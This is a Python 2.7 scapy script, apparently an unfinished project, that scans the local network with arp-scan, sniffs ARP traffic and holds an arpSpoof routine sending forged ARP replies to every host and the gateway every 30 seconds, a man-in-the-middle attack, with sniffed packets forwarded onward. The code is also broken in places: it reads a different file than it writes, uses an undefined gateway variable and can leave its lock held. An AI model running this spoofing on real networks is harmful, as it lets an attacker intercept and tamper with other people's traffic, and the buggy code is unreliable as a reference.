#python 2.7


import logging
from threading import Thread,Lock
from time import sleep
from scapy.all import *
from datetime import datetime
import functions
import os

# except ImportError:
#
#     #TODO: handle all cases of missing modules and try to solve
#     print 'a module is missing please check you have all required modules'

# global variables:
stop=False
localHost=[]
localAddresses=[]
addressesLock=Lock()

def add_packet(pkt):
    """
    adds sniffed packets to list of prescanned packets
    and sends it forward
    """
    if ARP not in pkt:
        pass
        #TODO:add to queue

    functions.sendPacket(pkt,localAddresses[0])



def get_MAC_Address(pkt):
    """
    adds host address if does not yet exist in listen
    """
    if pkt[ARP].op == 2: # is-at
        #if pkt[ARP].pdst==localHost[0]:
        address=(pkt[ARP].psrc,pkt[ARP].hwsrc)
        addressesLock.acquire()
        global localAddresses
        if address not in localAddresses:
            localAddresses.append(address)
            print len(localAddresses)
            addressesLock.release()
            #TODO: log all packets and check them for responses


def get_Local_Addresses():
    """
    scan network for all active hosts
    """

    os.system('arp-scan --localnet > arpscanOutput.txt')
    with open('arpscanResult.txt','r') as f:
        output=f.read()
    print output
    temp=output.split('\t')[:-1]
    addrs=[]
    for i in temp:
        addrs.append( i.split('\n')[-1])

    global localAddresses
    for i in range(0,len(addrs),2):
        host=(addrs[i],addrs[i+1])
        localAddresses.append(host)


def monitor_network():
    """
    monitors network for any new devices
    """

    sniff(prn=get_MAC_Address,filter=arp)

def arpSpoof(router,localMAC):
    """
    every 30 seconds send ARP broadcast to spoof all machines on LAN
    """

    while True:
        if len(localAddresses)>0:
            #TODO: change from handling dictionary to list
            addressesLock.acquire()
            for host in localAddresses:
                if host[0] != defaultGateway:

                    #create arp packets
                    victimPacket = Ether(src=localMAC,dst=host[1])/ARP(op=2, hwsrc=localMAC,psrc = router[0], pdst=host[0], hwdst = host[1])
                    #victimPacket.show()
                    gatewayPacket=Ether(dst=router[1],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=host[0],hwdst=router[1],pdst=router[0])
                    #gatewayPacket.show()

                    #send packets
                    sendp(victimPacket)
                    sendp(gatewayPacket)
            addressesLock.release()
            sleep(30)


def setup():
    """
    get all necessary values for the program to run
    and start all threads
    """
    global localHost
    #get default gateway and local IP address
    #defaultGateway,subnetMask,localHost=functions.getLocalhostAddress()
    logging.debug('got default gateway, local IP, local MAC and Subnet Mask')

    get_Local_Addresses()
    logging.debug('scanned network for all active hosts')

    monitorThread=Thread(target=monitor_network)
    #monitorThread.start()
    logging.debug('created thread for monitoring network for new devices')

    #arpThread=Thread(target=arpSpoof,args=(router,localHost[1],))
    #arpThread.start()
    logging.debug('created thread for ARP spoofing')

    #return defaultGateway,subnetMask


def main():
    """
    control the whole program
    gets the parameters for working
    then calls all functions in order
    """
    #setup logging to file logFile.txt
    logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format='%(lineno)s - %(levelname)s : %(message)s')
    logging.info('\n\n\n\n\n########## Program Start ##########\n\n')
    get_Local_Addresses()

    if not stop:
        #defaultGateway,subnetMask=setup() # get all necessary values before beginning
        pass

    while not stop: #main loop
        sniff(prn=add_packet,count=5) #listen for packets


    #TODO: add function to scan packets and update information about each device



if __name__=='__main__':
    main()
